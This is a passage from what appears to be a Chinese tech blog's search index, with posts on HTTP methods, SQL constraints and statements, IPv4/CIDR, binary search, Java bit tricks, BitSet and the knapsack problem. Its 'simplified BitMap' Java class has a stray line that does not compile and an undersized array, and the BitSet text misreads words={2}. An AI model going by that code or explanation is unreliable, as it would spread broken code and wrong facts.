OPTIONSOPTIONS方法表明请求想得到请求/响应链上关于此请求里的URI（Request-URI）指定资源的通信选项信息。此方法允许客户端去判定请求资源的选项和/或需求，或者服务器的能力，而不需要利用一个资源动作（译注：使用POST，PUT，DELETE方法）或一个资源获取（译注：用GET方法）方法。 这种方法的响应是不能缓存的.。 如果OPTIONS请求消息里包括一个实体主体（当请求消息里出现Content-Length或者Transfer-Encoding头域时），那么媒体类型必须通过Content-Type头域指明。虽然此规范没有定义如何使用此实体主体，将来的HTTP扩展可能会利用OPTIONS请求的消息主体去得到服务器得更多信息。一个服务器如果不支持OPTION请求的消息主体，它会遗弃此请求消息主体。 TRACETRACE方法沿着到目标资源的路径执行一个消息环回测试。 TRACE方法被用于激发一个远程的，应用层的请求消息回路（译注：TRACE方法让客户端测试到服务器的网络通路，回路的意思如发送一个请返回一个响应，这就是一个请求响应回路，）。最后的接收者或者是接收请求里Max-Forwards头域值为0源服务器或者是代理服务器或者是网关。TRACE请求不能包含一个实体。 PATCHPATCH方法用于对资源应用部分修改。 Reference 常见的HTTP Method深度解析 - https://segmentfault.com/a/1190000013182974 HTTP request methods - https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods","comments":true,"categories":[{"name":"HTTP","slug":"HTTP","permalink":"http://swsmile.info/categories/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"http://swsmile.info/tags/HTTP/"}]},{"title":"【SQL】约束（Constraints）","date":"2019-08-22T03:28:12.000Z","path":"2019/08/22/【SQL】约束/","text":"NOT NULL - 强制列不接受 NULL 值在默认的情况下，表的列接受 NULL 值。NOT NULL 约束强制列不接受 NULL 值。 NOT NULL 约束强制字段始终包含值。这意味着，如果不向字段添加值，就无法插入新记录或者更新记录。 下面的 SQL 强制 “ID” 列、 “LastName” 列以及 “FirstName” 列不接受 NULL 值： 实例 123456CREATE TABLE Persons ( ID int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255) NOT NULL, Age int); 添加 NOT NULL 约束在一个已创建的表的 “Age” 字段中添加 NOT NULL 约束如下所示： 实例 1ALTER TABLE Persons MODIFY Age int NOT NULL; 删除 NOT NULL 约束在一个已创建的表的 “Age” 字段中删除 NOT NULL 约束如下所示： 实例 1ALTER TABLE Persons MODIFY Age int NULL; UNIQUE - 保证某列的每行必须有唯一的值UNIQUE 约束唯一标识数据库表中的每条记录。 UNIQUE 和 PRIMARY KEY 约束均为列或列集合提供了唯一性的保证。 PRIMARY KEY 约束拥有自动定义的 UNIQUE 约束。 请注意，每个表可以有多个 UNIQUE 约束，但是每个表只能有一个 PRIMARY KEY 约束。 CREATE TABLE 时的 SQL UNIQUE 约束下面的 SQL 在 “Persons” 表创建时在 “P_Id” 列上创建 UNIQUE 约束： 123456789CREATE TABLE Persons ( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), UNIQUE (P_Id)) 如需命名 UNIQUE 约束，并定义多个列的 UNIQUE 约束，请使用下面的 SQL 语法： 123456789CREATE TABLE Persons( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), CONSTRAINT uc_PersonID UNIQUE (P_Id,LastName)) PRIMARY KEYPRIMARY KEY 是 NOT NULL 和 UNIQUE 的结合。确保某列（或两个列多个列的结合）有唯一标识，有助于更容易更快速地找到表中的一个特定的记录。 PRIMARY KEY 约束唯一标识数据库表中的每条记录。 主键必须包含唯一的值。 主键列不能包含 NULL 值。 每个表都应该有一个主键，并且每个表只能有一个主键。 CREATE TABLE 时的 SQL PRIMARY KEY 约束下面的 SQL 在 “Persons” 表创建时在 “P_Id” 列上创建 PRIMARY KEY 约束： 123456789CREATE TABLE Persons( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), PRIMARY KEY (P_Id)) 如需命名 PRIMARY KEY 约束，并定义多个列的 PRIMARY KEY 约束，请使用下面的 SQL 语法： 123456789CREATE TABLE Persons( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), CONSTRAINT pk_PersonID PRIMARY KEY (P_Id,LastName)) 注释：在上面的实例中，只有一个主键 PRIMARY KEY（pk_PersonID）。然而，pk_PersonID 的值是由两个列（P_Id 和 LastName）组成的。 FOREIGN KEY - 保证一个表中的数据匹配另一个表中的值的参照完整性一个表中的 FOREIGN KEY 指向另一个表中的 UNIQUE KEY(唯一约束的键)。 让我们通过一个实例来解释外键。请看下面两个表： “Persons” 表： P_Id LastName FirstName Address City 1 Hansen Ola Timoteivn 10 Sandnes 2 Svendson Tove Borgvn 23 Sandnes 3 Pettersen Kari Storgt 20 Stavanger “Orders” 表： O_Id OrderNo P_Id 1 77895 3 2 44678 3 3 22456 2 4 24562 1 请注意，”Orders” 表中的 “P_Id” 列指向 “Persons” 表中的 “P_Id” 列。 “Persons” 表中的 “P_Id” 列是 “Persons” 表中的 PRIMARY KEY。 “Orders” 表中的 “P_Id” 列是 “Orders” 表中的 FOREIGN KEY。 FOREIGN KEY 约束用于预防破坏表之间连接的行为。 FOREIGN KEY 约束也能防止非法数据插入外键列，因为它必须是它指向的那个表中的值之一。 CREATE TABLE 时的 SQL FOREIGN KEY 约束下面的 SQL 在 “Orders” 表创建时在 “P_Id” 列上创建 FOREIGN KEY 约束： 12345678CREATE TABLE Orders( O_Id int NOT NULL, OrderNo int NOT NULL, P_Id int, PRIMARY KEY (O_Id), FOREIGN KEY (P_Id) REFERENCES Persons(P_Id)) CHECK - 限制列中的值符合指定的条件CHECK 约束用于限制列中的值的范围。 如果对单个列定义 CHECK 约束，那么该列只允许特定的值。 如果对一个表定义 CHECK 约束，那么此约束会基于行中其他列的值在特定的列中对值进行限制。 CREATE TABLE 时的 SQL CHECK 约束下面的 SQL 在 “Persons” 表创建时在 “P_Id” 列上创建 CHECK 约束。CHECK 约束规定 “P_Id” 列必须只包含大于 0 的整数。 123456789CREATE TABLE Persons( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), CHECK (P_Id&gt;0)) DEFAULT - 向列中插入默认值DEFAULT 约束用于向列中插入默认值。 如果没有规定其他的值，那么会将默认值添加到所有的新记录。 CREATE TABLE 时的 SQL DEFAULT 约束下面的 SQL 在 “Persons” 表创建时在 “City” 列上创建 DEFAULT 约束： 12345678CREATE TABLE Persons( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255) DEFAULT &apos;Sandnes&apos;) Reference https://www.runoob.com/sql/sql-tutorial.html","comments":true,"categories":[{"name":"SQL","slug":"SQL","permalink":"http://swsmile.info/categories/SQL/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://swsmile.info/tags/SQL/"}]},{"title":"【SQL】常用 SQL 语句","date":"2019-08-22T03:20:13.000Z","path":"2019/08/22/【SQL】常用SQL语句/","text":"CREATE - 创建数据表以下为创建MySQL数据表的SQL通用语法： 1CREATE TABLE table_name (column_name column_type); 以下例子中我们将在 RUNOOB 数据库中创建数据表runoob_tbl： 1234567CREATE TABLE IF NOT EXISTS `runoob_tbl`( `runoob_id` INT UNSIGNED AUTO_INCREMENT, `runoob_title` VARCHAR(100) NOT NULL, `runoob_author` VARCHAR(40) NOT NULL, `submission_date` DATE, PRIMARY KEY ( `runoob_id` ))ENGINE=InnoDB DEFAULT CHARSET=utf8; 实例解析： 如果你不想字段为 NULL 可以设置字段的属性为 NOT NULL， 在操作数据库时如果输入该字段的数据为NULL ，就会报错。 AUTO_INCREMENT定义列为自增的属性，一般用于主键，数值会自动加1。 PRIMARY KEY关键字用于定义列为主键。 您可以使用多列来定义主键，列间以逗号分隔。 ENGINE 设置存储引擎，CHARSET 设置编码。 删除表结构或数据DROP - 删除数据表结构和清空数据以下为删除MySQL数据表的通用语法： 1DROP TABLE table_name; DELETE FROM - 清空数据（不删除数据表）1DELETE FROM table_name [WHERE Clause]; 1 删除指定数据删除表test中年龄等于30的且国家为US的所有数据： 1DELETE FROM test WHERE age=30 AND country='US'; 2 删除整个表中的数据删除表test中所有的数据（但保留表的定义）。 12DELETE FROM test 或者 DELETE FROM test;DELETE * FROM test 或者 DELETE * FROM test; 3 总结 如果没有指定 WHERE 子句，MySQL 表中的所有记录将被删除。 你可以在 WHERE 子句中指定任何条件 您可以在单个表中一次性删除记录。 TRUNCATE - 清空数据（不删除数据表）1TRUNCATE test; 删除表test中的所有数据，并释放空间，但不删除表结构。 三者区别delete，drop，truncate 都有删除表中数据的作用，区别在于： delete 和 truncate 仅仅删除表中所有数据，drop 连表数据和表结构一起删除（此后这张表就不存在了）。 delete 是 DML 语句，因此删除操作完成后，如果不想提交事务还可以回滚。而truncate 和 drop 是 DDL 语句，因此操作完马上生效，不能回滚。 delete 和 truncate相比： delete 语句中可以增加 where 条件，而truncate 语句中不能； delete 和 truncate 虽然都仅仅删除表中所有数据，但是由于truncate 是 DDL 语句，因此执行完 truncate 语句后，再插入数据时，自增长的数据id又重新从1开始（因为 DDL 语句相当于一切都重新定义了，因此主键 id 计数器会被重置为 1）。 ALTER - 修改数据表名/数据表字段类型及名称删除，添加或修改表字段如下命令使用了 ALTER 命令及 DROP 子句来删除以上创建表的 i 字段： 1mysql&gt; ALTER TABLE testalter_tbl DROP i; 如果数据表中只剩余一个字段则无法使用DROP来删除字段。 MySQL 中使用 ADD 子句来向数据表中添加列，如下实例在表 testalter_tbl 中添加 i 字段，并定义数据类型: 1mysql&gt; ALTER TABLE testalter_tbl ADD i INT; 执行以上命令后，i 字段会自动添加到数据表字段的末尾。 12345678mysql&gt; SHOW COLUMNS FROM testalter_tbl;+-------+---------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+---------+------+-----+---------+-------+| c | char(1) | YES | | NULL | || i | int(11) | YES | | NULL | |+-------+---------+------+-----+---------+-------+2 rows in set (0.00 sec) 如果你需要指定新增字段的位置，可以使用MySQL提供的关键字 FIRST (设定位第一列)， AFTER 字段名（设定位于某个字段之后）。 尝试以下 ALTER TABLE 语句, 在执行成功后，使用 SHOW COLUMNS 查看表结构的变化： 1234ALTER TABLE testalter_tbl DROP i;ALTER TABLE testalter_tbl ADD i INT FIRST;ALTER TABLE testalter_tbl DROP i;ALTER TABLE testalter_tbl ADD i INT AFTER c; FIRST 和 AFTER 关键字可用于 ADD 与 MODIFY 子句，所以如果你想重置数据表字段的位置就需要先使用 DROP 删除字段然后使用 ADD 来添加字段并设置位置。 修改字段类型及名称如果需要修改字段类型及名称, 你可以在ALTER命令中使用 MODIFY 或 CHANGE 子句 。 例如，把字段 c 的类型从 CHAR(1) 改为 CHAR(10)，可以执行以下命令: 1mysql&gt; ALTER TABLE testalter_tbl MODIFY c CHAR(10); 使用 CHANGE 子句, 语法有很大的不同。 在 CHANGE 关键字之后，紧跟着的是你要修改的字段名，然后指定新字段名及类型。尝试如下实例： 12mysql&gt; ALTER TABLE testalter_tbl CHANGE i j BIGINT;mysql&gt; ALTER TABLE testalter_tbl CHANGE j j INT;","comments":true,"categories":[{"name":"SQL","slug":"SQL","permalink":"http://swsmile.info/categories/SQL/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://swsmile.info/tags/SQL/"}]},{"title":"【Network】IPv4 地址","date":"2019-08-21T14:23:25.000Z","path":"2019/08/21/【Network】IP-IPv4地址/","text":"IPv4 地址IP地址由32位二进制数组成，这个地址通常分成 4 段，每 8 个二进制为一段。 但是，为便于使用，常以XXX.XXX.XXX.XXX形式表现，每组XXX代表小于或等于255的十进制数，比如大家非常熟悉的 192.168.0.1。 IP 地址分为两个部分： 网络 ID 主机 ID 但是具体哪部分属于网络 ID，哪些属于主机 ID 并没有规定。因为有些网络是需要很多主机的，这样的话代表主机 ID 的部分就要更多，但是有些网络需要的主机很少，这样主机 ID 的部分就应该少一些。 IPv4 地址的类别地址可分为A、B、C、D、E五大类，其中E类属于特殊保留地址。 绝大部分 IP 地址属于以下几类： A 类地址：IP 地址的前 8 位代表网络 ID ，后 24 位代表主机 ID。 B 类地址：IP 地址的前 16 位代表网络 ID ，后 16 位代表主机 ID。 C 类地址：IP 地址的前 24 位代表网络 ID ，后 8 位代表主机 ID。 这里能够很明显的看出 A 类地址能够提供出的网络的数量相对较少，但是每个网络可以拥有相对非常多的主机。 A类地址 A类地址第1字节为网络地址，其它3个字节为主机地址。它的第1个字节的第一位固定为0。 A类地址网络号范围：0.0.0.0—127.0.0.0，地址范围：0.0.0.0到127.255.255.255。 A类地址中的私有地址和保留地址： 10.X.X.X是私有地址（所谓的私有地址就是在互联网上不使用，而被用在局域网络中的地址），范围是 10.0.0.0—10.255.255.255。 127.X.X.X是保留地址，用做循环测试用的。 B类地址 B类地址第1字节和第2字节为网络地址，其它2个字节为主机地址。它的第1个字节的前两位固定为10。 B类地址网络号范围：128.0.0.0—191.255.0.0。地址范围128.0.0.0到191.255.255.255。 B类地址的私有地址和保留地址： 172.16.0.0—172.31.255.255是私有地址 169.254.X.X是保留地址。如果你的IP地址是自动获取IP地址，而你在网络上又没有找到可用的DHCP服务器。就会得到其中一个IP。 191.255.255.255是广播地址，不能分配。 C类地址 C类地址第1字节、第2字节和第3个字节为网络地址，第4个字节为主机地址。另外第1个字节的前三位固定为110。 C类地址网络号范围：192.0.0.0—223.255.255.0。地址范围 192.0.0.0到223.255.255.255。 C类地址中的私有地址： 192.168.X.X是私有地址，范围为 192.168.0.0—192.168.255.255。 D类地址 D类地址不区分网络地址和主机地址，它的第1个字节的前四位固定为1110。 D类地址范围：224.0.0.0—239.255.255.255 E类地址 E类地址不分网络地址和主机地址，它的第1个字节的前五位固定为11110。 E类地址范围：240.0.0.0—255.255.255.254 特殊的 IPv4 地址直接广播地址在A类、B类、C类IP地址中，全是 1 的主机 ID 代表广播，是用于向该网络中的全部主机方法消息的。 IP 地址为 130.100.255.255 就是网络 ID 为 130.100 网络的广播地址（二进制 IP 地址中全是 1 ，转换为十进制就是 255 ）。 受限广播地址（”limited broadcast” destination address）广播通信是一对所有的通信方式。若一个IP地址的二进制数全为1，也就是255.255.255.255，则这个地址用于定义整个互联网。如果设备想使IP数据报被整个Internet所接收，就发送这个目的地址全为1的广播包。 但这样会给整个互联网带来灾难性的负担，因此网络上的所有路由器都阻止具有这种类型的分组被转发出去，使这样的广播仅限于本地网段。 环回地址以十进制 127 开头的地址都是环回地址。目的地址是环回地址的消息，其实是由本地发送和接收的。主要是用于测试 TCP/IP 软件是否正常工作。我们用 ping 功能的时候，一般用的环回地址是 127.0.0.1。 专用地址IP地址空间中，有一些IP地址被定义为专用地址，这样的地址不能为Internet网络的设备分配，只能在企业内部使用，因此也称为私有地址。若要在Internet网上使用这样的地址，必须使用网络地址转换或者端口映射技术。 这些专有地址是： 10/8 地址范围：10.0.0.0到10.255.255.255，共有 $2^{24}$ 个地址。 172.16/12 地址范围：172.16.0.0至172.31.255.255，共有 $2^{20}$ 个地址。 192.168/16 地址范围：192.168.0.0至192.168.255.255，共有 $2^{16}$ 个地址。 子网掩码（subnet mask）//TODO https://www.cnblogs.com/hibernation/p/3275279.html CIDR（Classless Inter-Domain Routing）CIDR notation 其实概念也很直白，它不再粗暴的以字节为粒度来切分 IP 地址，而是精确到 bit 位，我们看一个典型的 CIDR notation： 123.121.114.144/23 注意 IP 地址后面的 /23，这就是 CIDR notation，它表示 IP 地址的前 23 bits 为 Network ID，剩余的 9 bits 为 Host ID。23 并不是 8 的倍数，我们将切分的精读提高到了 bit。我们可以通过简单的位运算，得到具体的 Network ID 和 Host ID，我们将 IP 地址和 /23 先转为二进制： 01111011.01111001.01110010.10010000 IP 地址 11111111.11111111.11111110.00000000 /23 subnet mask 上面两个二进制进行与操作，我们就可以得到 Network ID 和 Host ID： 01111011.01111001.01110010.00000000 Network ID 00000000.00000000.00000000.10010000 Host ID 再将二进制转换为十进制，我们就得到了便于理解的 Network ID：123.121.114.0。由于 Host ID 占用 9 个 bits，这个子网里一共可以有 2 的 9 次方个主机数，也就是 512 个主机，这个子网网段的起始地址为 123.121.114.0，结束地址为 123.121.115.255。我们对于某一个网段内的 IP 地址，有个约定，第一个地址为 Network ID，最后一个地址是该子网内的 Broadcast ID，那么剩下的可用于子网内设备的 IP 地址数量就是 510 个了。 Reference Oracle System Administration Guide: IP Services - https://docs.oracle.com/cd/E19683-01/806-4075/ipov-10/index.html Comer, D.E., 1995. Internetworking with TCP/IP, Vol. I: Principles, Protocols, and Architecture, 3/e. TCP/IP 协议 - https://juejin.im/entry/57a2b0742e958a006679dae0 关于 TCP/IP，必知必会的十个问题 - https://juejin.im/post/598ba1d06fb9a03c4d6464ab 网络编程懒人入门(九)：通俗讲解，有了IP地址，为何还要用MAC地址？ - http://www.52im.net/thread-2067-1-1.html 面试时，你被问到过 TCP/IP 协议吗? - https://juejin.im/post/58e36d35b123db15eb748856","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Algorithm】算法思想 - 二分法（Binary Search）","date":"2019-08-16T09:24:09.000Z","path":"2019/08/16/【Algorithm】算法思想-二分法/","text":"二分法题型一二分位置 之 OOXX，一般会给你一个数组，让你找数组中第一个/最后一个满足某个条件的位置：OOOOOOO…OOXX….XXXXXX。 Leetcode - 278 First Bad Version Lintcode - 159 Find Minimum in Rotated Sorted Array Leetcode - 74 Search a 2D Matrix Lintcode - 61 Search for a Range 模板12345678910111213141516171819202122232425public int findPosition(int[] nums, int target) &#123; // write your code here if (nums == null || nums.length == 0) return -1; int left = 0; int right = nums.length - 1; while (left + 1 &lt; right) &#123; int mid = left + (right - left) / 2; if (nums[mid] == target) return mid; else if (nums[mid] &gt; target) &#123; right = mid; &#125; else &#123; left = mid; &#125; &#125; if (nums[left] == target) return left; if (nums[right] == target) return right; return -1;&#125; 二分法题型二第二境界 二分位置 之 Half half，并无法找到一个条件，形成 OOXX 的模型，但可以根据判断，保留下有解的那一半或者去掉无解的一半 Lintcode - 75 Find Peak Element Lintcode - 585 Maximum Number in Mountain Sequence 二分答案 Binary Search on Result 往往没有给你一个数组让你二分 而且题目压根看不出来是个二分法可以做的题 同样是找到满足某个条件的最大或者最小值","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Markdown】Markdown 使用中 HTML","date":"2019-08-15T04:32:45.000Z","path":"2019/08/15/【Markdown】Markdown中使用HTML/","text":"Background在markdown中可以内嵌HTML，因此我们可以通过 HTML 来控制 markdown 中的字体显示（包括字体、字号与颜色），比如： 123456&lt;font face=\"黑体\"&gt;我是黑体字&lt;/font&gt;&lt;font face=\"微软雅黑\"&gt;我是微软雅黑&lt;/font&gt;&lt;font face=\"STCAIYUN\"&gt;我是华文彩云&lt;/font&gt;&lt;font color=#0099ff size=7 face=\"黑体\"&gt;color=#0099ff size=72 face=\"黑体\"&lt;/font&gt;&lt;font color=#00ffff size=72&gt;color=#00ffff&lt;/font&gt;&lt;font color=gray size=72&gt;color=gray&lt;/font&gt; 显示效果我是黑体字我是微软雅黑我是华文彩云color=#0099ff size=72 face=”黑体”color=#00ffffcolor=gray 注明 color=#00ffff 可以用十六位颜色值 color=gray 也可以用已知颜色名 Reference CSDN-markdown编辑器语法——字体、字号与颜色 - https://blog.csdn.net/testcs_dn/article/details/45719357/","comments":true,"categories":[{"name":"Markdown","slug":"Markdown","permalink":"http://swsmile.info/categories/Markdown/"}],"tags":[{"name":"Markdown","slug":"Markdown","permalink":"http://swsmile.info/tags/Markdown/"}]},{"title":"【Java】运算符 - 乘法除法问题","date":"2019-08-14T04:45:50.000Z","path":"2019/08/14/【Java】运算符-乘法除法问题/","text":"移位实现特殊乘除法运算当一个数乘以或者除以 2 的整数倍时，比如： 12a = a * 4;b = b / 4; 可以优化为： 12a = a &lt;&lt; 2;b = b &gt;&gt; 2; 说明： 除以2 = 右移1位 乘以2 = 左移1位除以4 = 右移2位 乘以4 = 左移2位除以8 = 右移3位 乘以8 = 左移3位… … 12System.out.println(66 /64); //1System.out.println(66 &gt;&gt; 6); //1 使用位操作代替求余操作由于我们知道位运算比较高效，在某些情况下，当b为2的n次方时，有如下替换公式： a % b = a &amp; (b-1)(b=2n)即：a % 2n = a &amp; (2n-1) 例如：14%8，取余数，相当于取出低位，而余数最大为7，14二进制为1110，8的二进制1000，8-1 = 7的二进制为0111，由于现在低位全为1，让其跟14做&amp;运算，正好取出的是其低位上的余数。 1110&amp;0111=110即6=14%8； 此公式只适用b=2n，是因为可以保证b始终只有最高位为1，其他二进制位全部为0，减去1，之后，可以把高位1消除，其他位都为1，而与1做&amp;运算，会保留原来的数。","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】源码 - BitSet","date":"2019-08-14T04:36:39.000Z","path":"2019/08/14/【Java】源码-BitSet/","text":"什么是BitSet？BitSet类实现了一个按需增长的位向量。位Set的每一个组件都有一个boolean值。用非负的整数将BitSet的位编入索引。可以对每个编入索引的位进行测试、设置或者清除。通过逻辑与、逻辑或和逻辑异或操作，可以使用一个 BitSet修改另一个 BitSet的内容。 默认情况下，set 中所有位的初始值都是false。 每个位 set 都有一个当前大小，也就是该位 set 当前所用空间的位数。注意，这个大小与位 set 的实现有关，所以它可能随实现的不同而更改。位 set 的长度与位 set 的逻辑长度有关，并且是与实现无关而定义的。 BitSet的索引范围从 0 到 nbits-1 。 实现123456789101112131415161718192021222324252627282930public class BitSet implements Cloneable, java.io.Serializable &#123; /* * BitSets are packed into arrays of \"words.\" Currently a word is * a long, which consists of 64 bits, requiring 6 address bits. * The choice of word size is determined purely by performance concerns. */ private final static int ADDRESS_BITS_PER_WORD = 6; private final static int BITS_PER_WORD = 1 &lt;&lt; ADDRESS_BITS_PER_WORD; private final static int BIT_INDEX_MASK = BITS_PER_WORD - 1; /* Used to shift left or right for a partial word mask */ private static final long WORD_MASK = 0xffffffffffffffffL; /** * @serialField bits long[] * * The bits in this BitSet. The ith bit is stored in bits[i/64] at * bit position i % 64 (where bit position 0 refers to the least * significant bit and 63 refers to the most significant bit). */ private static final ObjectStreamField[] serialPersistentFields = &#123; new ObjectStreamField(\"bits\", long[].class), &#125;; /** * The internal field corresponding to the serialField \"bits\". */ private long[] words; ... 可以看到，BitSet的底层实现是使用long数组作为内部存储结构的，所以BitSet的大小为long类型大小(64位)的整数倍。 构造函数12345678910111213141516171819202122232425/** * Creates a new bit set. All bits are initially &#123;@code false&#125;. */public BitSet() &#123; initWords(BITS_PER_WORD); sizeIsSticky = false;&#125;/** * Creates a bit set whose initial size is large enough to explicitly * represent bits with indices in the range &#123;@code 0&#125; through * &#123;@code nbits-1&#125;. All bits are initially &#123;@code false&#125;. * * @param nbits the initial size of the bit set * @throws NegativeArraySizeException if the specified initial size * is negative */public BitSet(int nbits) &#123; // nbits can't be negative; size 0 is OK if (nbits &lt; 0) throw new NegativeArraySizeException(\"nbits &lt; 0: \" + nbits); initWords(nbits); sizeIsSticky = true;&#125; BitSet()：创建一个新的位 set，默认大小是64位。 BitSet(int nbits)：创建一个位set，它的初始大小足以显式表示索引范围在 0 到 nbits-1 的位。 计算 words 的长度在构造函数中，需要为字段 words （它本质是一个long[]）分配内存空间，那 BitSet 会给它分配多大呢？ 12345678910111213141516 /* * BitSets are packed into arrays of \"words.\" Currently a word is * a long, which consists of 64 bits, requiring 6 address bits. * The choice of word size is determined purely by performance concerns. */ private final static int ADDRESS_BITS_PER_WORD = 6; private void initWords(int nbits) &#123; words = new long[wordIndex(nbits-1) + 1]; &#125; /** * Given a bit index, return word index containing it. */ private static int wordIndex(int bitIndex) &#123; return bitIndex &gt;&gt; ADDRESS_BITS_PER_WORD; &#125; words 数组的最大长度计算：(maxValue - 1) &gt;&gt; 6 + 1 如果指定了bitset的初始化大小，那么会把他规整到一个大于或者等于这个数字的64的整倍数。比如64位，bitset的大小是1个long，而65位时，bitset大小是2个long，即128位。 读取方法我们再来看看如何在给定一个数值时，定位到这个数值对应在 long[]中的 bit 位： 1234567891011121314151617181920212223/** * Returns the value of the bit with the specified index. The value * is &#123;@code true&#125; if the bit with the index &#123;@code bitIndex&#125; * is currently set in this &#123;@code BitSet&#125;; otherwise, the result * is &#123;@code false&#125;. * * @param bitIndex the bit index * @return the value of the bit with the specified index * @throws IndexOutOfBoundsException if the specified index is negative */public boolean get(int bitIndex) &#123; if (bitIndex &lt; 0) throw new IndexOutOfBoundsException(\"bitIndex &lt; 0: \" + bitIndex); checkInvariants(); int wordIndex = wordIndex(bitIndex); return (wordIndex &lt; wordsInUse) &amp;&amp; ((words[wordIndex] &amp; (1L &lt;&lt; bitIndex)) != 0);&#125;private static int wordIndex(int bitIndex) &#123; return bitIndex &gt;&gt; ADDRESS_BITS_PER_WORD;&#125; 首先，通过 currentNumber &gt;&gt; 6 计算出位于哪一个 long（或者说long[]中的索引位置），(words[wordIndex] &amp; (1L &lt;&lt; bitIndex)) != 0 等价于判断 (words[wordIndex] &amp; (1L &lt;&lt; bitIndex)) 是否为 0。这里的含义是将 1 左移 bitIndex个位，将右移后的结果值与 words[wordIndex] 进行与运算，若为 1，则表明wordIndex的对应 flag 为 true。 当words为 {0} 时，表示所有 flag 均为 false。 当words为 {1} 时，表示 0 的 flag 为 true，其余均为 false。 当words为 {2} 时，表示 0 的 flag 为 true， 1 的 flag 为 true，其余均为 false。 使用场景常见的应用场景是对海量数据进行一些统计工作，比如日志分析、用户数统计等。 比如一道面试题：有1千万个随机数，随机数的范围在1到1亿之间。现在要求写出一种算法，将1到1亿之间没有在随机数中的数求出来？ 代码示例如下： 123456789101112131415161718192021222324252627282930public static void main(String[] args)&#123; Random random=new Random(); List&lt;Integer&gt; list=new ArrayList&lt;&gt;(); for(int i=0;i&lt;10000000;i++) &#123; int randomResult=random.nextInt(100000000); list.add(randomResult); &#125; System.out.println(\"产生的随机数有\"); for(int i=0;i&lt;list.size();i++) &#123; System.out.println(list.get(i)); &#125; BitSet bitSet=new BitSet(100000000); for(int i=0;i&lt;10000000;i++) &#123; bitSet.set(list.get(i)); &#125; System.out.println(\"0~1亿不在上述随机数中有\"+bitSet.size()); for (int i = 0; i &lt; 100000000; i++) &#123; if(!bitSet.get(i)) &#123; System.out.println(i); &#125; &#125; &#125; 简化版实现1234567891011121314151617181920212223242526272829303132333435363738class BitMap &#123; private long maxValue; private static int[] words; //构造函数中传入数据中的最大值（范围为 1-最大值） public BitMap(long maxValue) &#123; this.maxValue = maxValue; // 根据长度算出，所需数组大小 words = new int[(int) ((maxValue - 1) &gt;&gt; 5)]; // 用移位运算代替除法，效率更高 &#125; public int getBit(long index) &#123; int word = words[(int) ((index - 1) &gt;&gt; 5)]; // (index - 1) &amp; 31 相当于对 index-1 按 32 求余数 int offset = (int) ((index - 1) &amp; 31); return (word &gt;&gt; offset) &amp; 0x01; &#125; public void setBit(long index) &#123; // 求出该index - 1所在bitMap的下标 int wordIndex = (int) ((index - 1) &gt;&gt; 5); // 求出该值的偏移量(求余) int offset = (int) ((index - 1) &amp; 31); int word = words[wordIndex]; words[wordIndex] = word | (0x01 &lt;&lt; offset); (words[wordIndex] &amp; (bitIndex &gt;&gt; 1L)) &#125; public static void main(String[] args) &#123; BitMap bitMap = new BitMap(32); bitMap.setBit(32); System.out.println(bitMap.getBit(1)); System.out.println(bitMap.getBit(32)); &#125;&#125; Reference Java BitSet使用场景和示例 - https://www.cnblogs.com/xujian2014/p/5491286.html Java 面试中常用的 BitMap 代码 - https://www.jianshu.com/p/9e7f8f33a61a","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Algorithm】动态规划 - 背包问题","date":"2019-08-13T13:35:30.000Z","path":"2019/08/13/【Algorithm】动态规划-背包问题/","text":"主要分类0-1背包每个物品只能取一次 Leetcode： Leetcode 474. Ones and Zeroes（01背包） 爆搜解法 用 4 个 bit 分别标识 4 种物品，取还是不取。 贪心法 - 错误解所有的贪心，都是错误的！！！ 反例： 取价值最高 m=2, A = [1, 1, 2], V = [2, 2, 3] • 贪心答案：3，正确答案：4 取重量最轻 m=2, A = [1, 1, 2], V = [1, 1, 3] 贪心答案：2，正确答案 取单位价值最高 m=3, A = [1, 1, 3], V = [2, 2, 5] 贪心答案：4，正确答案：5 爆搜算法的局限 动态规划解法举例1： 背包容量 m = 10 物品大小 A = [2, 3, 5, 7] 物品价值 V = [1, 5, 2, 4] 使用数组来记录可取前i个物品，在容量j的情况下能取的最大价值 i/j 0 1 2 3 4 5 6 7 8 9 10 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 1 1 1 1 1 1 1 2 0 0 1 5 5 6 6 6 6 6 6 3 0 0 1 5 5 6 6 6 7 7 8 4 0 0 1 5 5 6 6 6 7 7 9 dp[i][j]表示前i个物体，在容量j的情况下，能取到的最大价值： 如果取第i个物体，价值为dp[i - 1][j - A[i]] + V[i] (j-A[i]&gt;0) 如果不取第i个物体，价值为dp[i - 1][j] 状态转移：dp[i][j] = max(dp[i - 1][j – A[i]] + V[i], dp[i - 1][j]) 123456789101112131415161718public static int backPackII(int m, int[] A, int[] V) &#123; int[][] maxs = new int[A.length + 1][m + 1]; for (int i = 0; i &lt; maxs.length; i++) &#123; for (int j = 0; j &lt; maxs[0].length; j++) &#123; if (i == 0 || j == 0) 